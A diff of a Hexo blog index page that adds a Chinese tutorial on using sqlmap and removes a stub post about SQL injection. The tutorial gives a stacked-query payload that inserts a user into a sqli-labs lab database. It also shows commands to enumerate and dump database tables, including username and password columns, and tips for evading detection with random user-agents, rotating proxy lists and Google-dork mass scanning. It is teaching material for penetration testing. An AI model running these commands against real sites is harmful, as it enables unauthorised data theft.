@@ -614,6 +614,170 @@
   
   
   
+    <article id="post-sqlmap的使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2022/03/28/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/">sqlmap的使用</a>
+	
+    </h1>
+  
+
+
+
+  
+  
+<a href="/2022/03/28/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/" class="archive-article-date">
+        <time datetime="2022-03-28T12:01:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-28</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p>sqlmap 是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令)。</p>
+<p><a target="_blank" rel="noopener" href="http://www.sqlmap.org/">官方网站</a></p>
+<p>注意：</p>
+<p>sqlmap是由2.x版本Python语言编写的，所以在安装 sqlmap 之前应先搭建好相应的 <a target="_blank" rel="noopener" href="https://www.python.org/">Python环境</a> 。</p>
+<h2 id="二、SQLMAP-支持的注入类型-5种"><a href="#二、SQLMAP-支持的注入类型-5种" class="headerlink" title="二、SQLMAP 支持的注入类型(5种):"></a>二、SQLMAP 支持的注入类型(5种):</h2><p><strong>1.基于布尔的盲注检测</strong></p>
+<p>(如果一个url的地址为 xxxx.php?id&#x3D;1 ,那么我们可以尝试下加上 and1&#x3D;1(和没加and 1&#x3D;1结果保持一致)和and 1&#x3D;2(和不加and 1&#x3D;2结果不一致),则我们基本可以确定是存在布尔注入的)</p>
+<p><strong>2.基于时间的盲注检测</strong></p>
+<p>(和基于布尔的检测有些类似.通过 mysql 的 sleep(int) )来观察浏览器的响应是否等待了你设定的那个值，如果等待了,则表示执行了 sleep ,则基本确定是存在sql注入的。</p>
+<p><strong>3.基于错误的检测</strong></p>
+<p>(组合查询语句,看是否报错(在服务器没有抑制报错信息的前提下),如果报错则证明我们组合的查询语句特定的字符被应用了,如果不报错,则我们输入的特殊字符很可能被服务器给过滤掉(也可能是抑制了错误输出.))</p>
+<p><strong>4.基于union联合查询的检测</strong></p>
+<p>(适用于如果某个web项目对查询结果只展示一条而我们需要多条的时候则使用 union 联合查询搭配 group_concat 还可以获取更多的信息)</p>
+<p><strong>5.基于堆叠查询的检测</strong></p>
+<p>(首先看服务器支不支持”多语句查询”,一般服务器sql语句都是写死的,某些特定的地方用占位符来接受用户输入的变量,这样即使我们加and 也只能执行select(也不一定select,主要看应用场景,总之就是服务端写了什么,你就能执行什么)查询语句,如果能插入分号;则我们后面可以自己组update，insert，delete等语句来进行进一步操作) 。例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http ://192.168.1.63/sqli-labs/Less-38/?id=1&#x27;;insert into users(id,username,password) values (&#x27;66&#x27;,&#x27;root&#x27;,&#x27;kdkid&#x27;)--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、常规使用："><a href="#三、常规使用：" class="headerlink" title="三、常规使用："></a>三、常规使用：</h2><h3 id="①kali中检查sqlmap版本信息"><a href="#①kali中检查sqlmap版本信息" class="headerlink" title="①kali中检查sqlmap版本信息:"></a>①kali中检查sqlmap版本信息:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -h</span><br></pre></td></tr></table></figure>
+
+<h3 id="②探测单个目标："><a href="#②探测单个目标：" class="headerlink" title="②探测单个目标："></a>②探测单个目标：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.63/sqli-labs/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="③探测多个目标："><a href="#③探测多个目标：" class="headerlink" title="③探测多个目标："></a>③探测多个目标：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># vim sqliurl.txt</span><br><span class="line">http://192.168.1.63/sqli-labs/Less-1/?id=1</span><br><span class="line">http://192.168.1.63/sqli-labs/Less-2/?id=1</span><br><span class="line">http://192.168.1.63/sqli-labs/Less-3/?id=1</span><br><span class="line"></span><br><span class="line">无交互，使用默认方式进行探测：</span><br><span class="line">└─# sqlmap -m sqliurl.txt --dbs --users --batch</span><br><span class="line"></span><br><span class="line">-m      #指定文件进行探测</span><br><span class="line">--dbs   #探测可用数据库名称</span><br><span class="line">--users #探测数据库用户名称</span><br><span class="line">--batch #参数可以在探测过程中不使用交互式信息来询问我们是否继续探测。一切都使用默认配置。</span><br></pre></td></tr></table></figure>
+
+<h3 id="④从文件加载-HTTP-请求进行探测："><a href="#④从文件加载-HTTP-请求进行探测：" class="headerlink" title="④从文件加载 HTTP 请求进行探测："></a>④从文件加载 HTTP 请求进行探测：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># vim Cookie.txt</span><br><span class="line">GET /sqli-labs/Less-20/index.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.63</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.1.63/sqli-labs/Less-20/</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uname=admin*     #注：需要在注入点添加*号</span><br><span class="line"></span><br><span class="line">└─# sqlmap -r Cookie.txt --level 3 --batch –dbs</span><br><span class="line"></span><br><span class="line">-r      用来指定 HTTP 请求文件</span><br><span class="line">--level 检测级别，取值（1-5）</span><br><span class="line"></span><br><span class="line">默认情况下 Sqlmap 会测试所有 GET 参数和 POST 参数，</span><br><span class="line">当 level大于等于 2 时会测试 cookie 参数，</span><br><span class="line">当 level 大于等于 3 时会测试 User-Agent 和 Referer，</span><br><span class="line">当 level=5时会测试 Host 头。</span><br></pre></td></tr></table></figure>
+
+<h3 id="⑤从-burpsuite-日志记录中进行探测："><a href="#⑤从-burpsuite-日志记录中进行探测：" class="headerlink" title="⑤从 burpsuite 日志记录中进行探测："></a>⑤从 burpsuite 日志记录中进行探测：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Burpsuite 开启日志记录：</span><br><span class="line">1、点击Project options</span><br><span class="line">2、在Misc的Logging中的Proxy的Requests前打勾并保存为bp.txt文件。</span><br><span class="line">3、浏览器中访问几个页面进行测试</span><br><span class="line">http://192.168.43.63/sqli-labs/Less-1/?id=1</span><br><span class="line">http://192.168.43.63/sqli-labs/Less-2/?id=1</span><br><span class="line">http://192.168.43.63/sqli-labs/Less-3/?id=1</span><br><span class="line">http://192.168.43.63/sqli-labs/Less-4/?id=1</span><br><span class="line">全部点击放行</span><br><span class="line">4、文件中查看日志信息</span><br><span class="line">└─# cat bp.txt</span><br><span class="line">5、使用日志文件进行探测</span><br><span class="line">└─# sqlmap -l bp.txt --leve 3 --dbs --batch</span><br></pre></td></tr></table></figure>
+
+<h3 id="⑥检测-SQL-注入漏洞存在的技术类型-BEUSTQ-："><a href="#⑥检测-SQL-注入漏洞存在的技术类型-BEUSTQ-：" class="headerlink" title="⑥检测 SQL 注入漏洞存在的技术类型(BEUSTQ)："></a>⑥检测 SQL 注入漏洞存在的技术类型(BEUSTQ)：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">B: Boolean-based blind（布尔盲注）</span><br><span class="line">E: Error-based（报错注入）</span><br><span class="line">U: Union query-based（联合查询注入）</span><br><span class="line">S: Stacked queries（堆叠查询-文件系统，操作系统，注册表相关注入）</span><br><span class="line">T: Time-based blind（时间盲注）</span><br><span class="line">Q:Inline queries（内联查询注入）</span><br><span class="line"></span><br><span class="line">默认全部使用</span><br><span class="line">注：当使用 sqlmap 要读取目标系统上文件，或对目标系统进行指令的操作，或者对读取目标系统注册表（windows）的话，需要使用 S。</span><br><span class="line"></span><br><span class="line">例 1：指定使用布尔型探测</span><br><span class="line">└─# sqlmap -u &quot;http://192.168.43.63/sqli-labs/Less-1/?id=1&quot; --technique=B --batch</span><br><span class="line">可以看到探测使用的 payload 是布尔型。</span><br></pre></td></tr></table></figure>
+
+<h3 id="⑦枚举数据库信息"><a href="#⑦枚举数据库信息" class="headerlink" title="⑦枚举数据库信息"></a>⑦枚举数据库信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">--dbs         #枚举数据库名称</span><br><span class="line">--tables        #枚举表名称</span><br><span class="line">--columns    #枚举字段名称</span><br><span class="line"></span><br><span class="line">例 1：获取数据库名称</span><br><span class="line">└─# sqlmap -u &quot;http://192.168.43.63/sqli-labs/Less-1/?id=1&quot; --dbs</span><br><span class="line"></span><br><span class="line">例 2：获取表名称</span><br><span class="line">└─# sqlmap -u &quot;http://192.168.43.63/sqli-labs/Less-1/?id=1&quot; -D security --tables</span><br><span class="line">-D #指定数据库进行枚举表名称</span><br><span class="line"></span><br><span class="line">例 3：获取字段名称</span><br><span class="line">获取 security 数据库中 users 表中的字段名称</span><br><span class="line">└─# sqlmap -u &quot;http://192.168.43.63/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns</span><br><span class="line"></span><br><span class="line">例 4：获取字段数据</span><br><span class="line">└─# sqlmap -u &quot;http://192.168.1.63/sqli-labs/Less-1/?id=1&quot; --dump -D security -T users -C &quot;username,password&quot;</span><br><span class="line"></span><br><span class="line">--dump  #转储获取到的数据库信息。</span><br><span class="line">-C      #指定字段</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、SQLMAP-请求参数"><a href="#四、SQLMAP-请求参数" class="headerlink" title="四、SQLMAP 请求参数"></a>四、SQLMAP 请求参数</h2><h3 id="1、默认的请求参数"><a href="#1、默认的请求参数" class="headerlink" title="1、默认的请求参数"></a>1、默认的请求参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">打开 WireShark 关闭混杂模式进行抓包，捕获过滤器：host 192.168.43.63</span><br><span class="line">执行探测任务</span><br><span class="line">└─# sqlmap -u &quot;http://192.168.43.63/sqli-labs/Less-1/?id=1&quot; --batch</span><br><span class="line"></span><br><span class="line">执行完成后停止抓包</span><br><span class="line">可以看到默认的 User-Agent 为：User-Agent: sqlmap/1.5.2#stable (http://sqlmap.org)\r\n </span><br><span class="line">SQLMAP 的特征非常明显，网站管理员可以通过这些明显的特征对我们的访问进行过滤。</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、修改默认请求参数"><a href="#2、修改默认请求参数" class="headerlink" title="2、修改默认请求参数"></a>2、修改默认请求参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">例 1:手动指定请求参数</span><br><span class="line">重新开始抓包</span><br><span class="line">└─# sqlmap -u &quot;http://192.168.1.63/sqli-labs/Less-1/?id=1&quot; --user-agent=&quot;Mozilla/5.0(X11; Linux x86_64; rv:68.0) Gecko/20100101&quot; --batch</span><br><span class="line"></span><br><span class="line">--user-agent #手动指定 User-Agent 内容</span><br><span class="line">User-Agent是什么?</span><br><span class="line">User-Agent 中文名为用户代理，简称UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</span><br><span class="line">通过--user-agent 选项指定后，可以发现 User-Agent 是我们所指定的伪造内容信息，从而可以绕过网站管理员过滤。</span><br><span class="line"></span><br><span class="line">例 2：随机修改请求参数</span><br><span class="line">重新开始抓包</span><br><span class="line">└─# sqlmap -u &quot;http://192.168.43.63/sqli-labs/Less-1/?id=1&quot; --random-agent --batch</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、使用代理进行探测"><a href="#3、使用代理进行探测" class="headerlink" title="3、使用代理进行探测"></a>3、使用代理进行探测</h3><p>使用代理进行探测时，是不能够探测内网目标的，除非目标在公网也能够正常访问。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# sqlmap -u &quot;http://xxx.xxxx.com/forum.php?gid=100&quot; --proxy &quot;http://14.20.235.129:34100&quot; --delay=&quot;1&quot; --random-agent --batch</span><br></pre></td></tr></table></figure>
+
+<p>结果是，虽然使用了代理，但是我们还是被服务器屏蔽了，所以我们这个时候就不能使用单一代理的方式进行探测，我们需要使用代理文件来指定多个代理进行探测。</p>
+<p>例 ：使用多个代理地址进行探测<br>新建代理列表文件，填写多个代理地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─# vim proxy.txt</span><br><span class="line">http://14.20.235.129:34100</span><br><span class="line">http://115.218.2.233:9000</span><br><span class="line">http://14.20.235.129:34100</span><br><span class="line">http://223.241.77.236:3256</span><br><span class="line">http://221.127.107.174:80</span><br><span class="line"></span><br><span class="line"># sqlmap -u &quot;http://xxx.xxxx.com/forum.php?gid=100&quot;--proxy-file=/root/proxy.txt --delay 1 --random-agent --batch</span><br><span class="line"># --proxy-file 指定代理文件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g &quot;google 语法&quot; --dump-all --batch </span><br><span class="line">#google 搜索注入点自动 跑出所有字段</span><br><span class="line"></span><br><span class="line">└─# sqlmap -g &quot;inurl:php?id=1&quot; --proxy &quot;http://物理机代理的IP:http代理的端口&quot; --random-agent --batch --dbs</span><br></pre></td></tr></table></figure>
+
+<h3 id="4、忽略未验证错误"><a href="#4、忽略未验证错误" class="headerlink" title="4、忽略未验证错误"></a>4、忽略未验证错误</h3><p>参数：</p>
+<p>–ignore-401  #忽略未验证错误</p>
+<h3 id="5、sqlmap安全模式"><a href="#5、sqlmap安全模式" class="headerlink" title="5、sqlmap安全模式"></a>5、sqlmap安全模式</h3><p>如果执行了一定数量的不成功请求，则Web应用程序或其间的检查技术会破坏会话。这可能发生在sqlmap的检测阶段或利用任何SQL盲注类型时。原因是SQL有效负载不一定返回输出，因此可能被应用程序会话管理或检查技术检测到从而破坏会话。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--safe-url   #测试期间经常访问的URL地址。</span><br><span class="line">--safe-post  #HTTP PQST数据发送到给定的安全URL地址。</span><br><span class="line">--safe-req   #从文件加载并使用安全的HTTP请求。</span><br><span class="line">--safe-freq  #在两次访问给定安全位置之间测试请求。</span><br><span class="line"></span><br><span class="line">sqlmap 将访问每个预定义数量的请求，而不对safe url执行任何类型的注入。</span><br></pre></td></tr></table></figure>
+<h3 id="6、关闭URL编码"><a href="#6、关闭URL编码" class="headerlink" title="6、关闭URL编码"></a>6、关闭URL编码</h3><p>参数：</p>
+<p>–skip-urlencode  #这种情况用于后端服务器不遵循RFC标准(URL编码的标准)并要求数据以非编码方式进行传输。</p>
+<h2 id="五、sqlmap常用参数优化"><a href="#五、sqlmap常用参数优化" class="headerlink" title="五、sqlmap常用参数优化"></a>五、sqlmap常用参数优化</h2><h3 id="例1-预测输出算法"><a href="#例1-预测输出算法" class="headerlink" title="例1:预测输出算法"></a>例1:预测输出算法</h3><p>参数: –predict-output<br>#该参数使用推理算法，用于对检索到的值的字符进行顺序统计预测，根据sqlmap工作目录下的 &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;txt&#x2F;common-outputs.txt</p>
+<p>结合当前枚举到的数据给出的预测，从而提升探测效率，当然如果有遇到常见的名称也可以手动添加到 &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;txt&#x2F;common-outputs.txt 文件中。</p>
+<p>请注意，此开关与 –threads 开关不兼容。</p>
+<h3 id="例2-设置持久连接"><a href="#例2-设置持久连接" class="headerlink" title="例2:设置持久连接"></a>例2:设置持久连接</h3><p>参数:  –keep-alive</p>
+<p>·使用http(s)长连接，性能好</p>
+<p>·与–proxy参数不兼容</p>
+<p>·长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</p>
+<h3 id="例3-设置空连接"><a href="#例3-设置空连接" class="headerlink" title="例3:设置空连接"></a>例3:设置空连接</h3><p>参数: –null-connection<br>#该参数使用HEAD方式发送HTTP请求，目的是不接收服务器返回的body信息，只接收返回的页面大小，这样就减小了数据包的大小，从而提高盲注探测性能。</p>
+<h3 id="例4-配置多线程"><a href="#例4-配置多线程" class="headerlink" title="例4:配置多线程"></a>例4:配置多线程</h3><p>参数: –threads<br>#默认使用1个线程，最大为10，如果目标服务器不存在访问限制而且性能较好的情况下可以设置多个线程同时进行探测，建议不要超过10，否则可能影响站点可用性。<br>与–predict-output参数不兼容。</p>
+<h3 id="拓展参数-o"><a href="#拓展参数-o" class="headerlink" title="拓展参数-o"></a>拓展参数-o</h3><p>该参数捆绑例1、2、3三个参数，使用该参数表示同时使用以上所有参数（除–threads参数)。线程数默认为1。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">SQLMAP官方资料</a> </p>
+<p>文档是英文，可用Google翻译。</p>
+<h3 id="Sqlmap一共有5个探测等级，默认是1。"><a href="#Sqlmap一共有5个探测等级，默认是1。" class="headerlink" title="Sqlmap一共有5个探测等级，默认是1。"></a>Sqlmap一共有5个探测等级，默认是1。</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">等级越高，说明探测时使用的payload也越多。</span><br><span class="line">其中5级的payload最多，会自动破解出cookie、XFF等头部注入。</span><br><span class="line"></span><br><span class="line">当然，等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试，</span><br><span class="line">HTTP cookie 在 level 为 2 时就会测试，</span><br><span class="line">HTTP  User-Agent/Referer 头在 level 为 3 时就会测试。</span><br><span class="line"></span><br><span class="line">在不确定哪个参数为注入点时，为了保证准确性，建议设置level为5</span><br></pre></td></tr></table></figure>
+<h3 id="sqlmap一共有3个危险等级，也就是说你认为这个网站存在几级的危险等级。"><a href="#sqlmap一共有3个危险等级，也就是说你认为这个网站存在几级的危险等级。" class="headerlink" title="sqlmap一共有3个危险等级，也就是说你认为这个网站存在几级的危险等级。"></a>sqlmap一共有3个危险等级，也就是说你认为这个网站存在几级的危险等级。</h3><p>和探测等级一个意思，在不确定的情况下，建议设置为3级，–risk&#x3D;3</p>
+
+    
+
+
+ <!-- 增加版权声明 -->
+ 
+ 
+ <div class="declare" hidden="hidden"></div>
+    
+<!-- 增加版权声明 -->
+<!--  -->
+<!-- 增加版权声明结束 --> 
+
+    
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">penetration</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Web vulnerability</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2022/03/28/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+<!--gitalk评论系统代码添加-->
+
+  
+  
+  
     <article id="post-hexo博客yilia主题上一页下一页显示的问题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1126,110 +1290,6 @@
   
   
   
-    <article id="post-SQL注入思路" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2022/03/27/SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF/">SQL注入思路</a>
-	
-    </h1>
-  
-
-
-
-  
-  
-<a href="/2022/03/27/SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF/" class="archive-article-date">
-        <time datetime="2022-03-27T08:00:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-27</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>SQL注入的前提、本质、危害、分类、发现注入点、手工注入与盲注思路……
-    
-    <a class="article-more-a" href="/2022/03/27/SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF/#more">more >></a>
-    
-    
-
-
- <!-- 增加版权声明 -->
- 
- 
- <div class="declare" hidden="hidden"></div>
-    
-<!-- 增加版权声明 -->
-<!--  -->
-<!-- 增加版权声明结束 --> 
-
-    
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">penetration</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Web vulnerability</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2022/03/27/SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-<!--gitalk评论系统代码添加-->
-
-  
-  
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
@@ -1367,7 +1427,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">基础</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1379,7 +1439,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color3">基础</a>
               </li>
              
               <li class="article-tag-list-item">
